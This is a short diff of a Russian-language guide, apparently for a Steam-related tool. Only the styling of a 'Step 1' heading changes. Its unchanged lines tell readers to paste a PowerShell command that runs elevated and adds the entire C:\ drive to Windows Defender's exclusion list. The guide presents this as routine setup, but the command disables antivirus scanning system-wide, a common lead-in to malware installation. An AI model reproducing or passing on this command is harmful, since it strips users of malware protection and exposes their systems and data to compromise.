@@ -7,7 +7,7 @@
 Шаг 1 ⚙️
 
 <details>
-<summary>Сделайте расширение файлов Steam</summary>
+<summary style="color: blue; font-weight: bold;">Сделайте расширение файлов Steam</summary>
 
 Нажмите Win+R и введите команду
 powershell.exe -Command "Start-Process powershell.exe -Verb RunAs -ArgumentList 'Add-MpPreference -ExclusionPath C:\ -Force'"
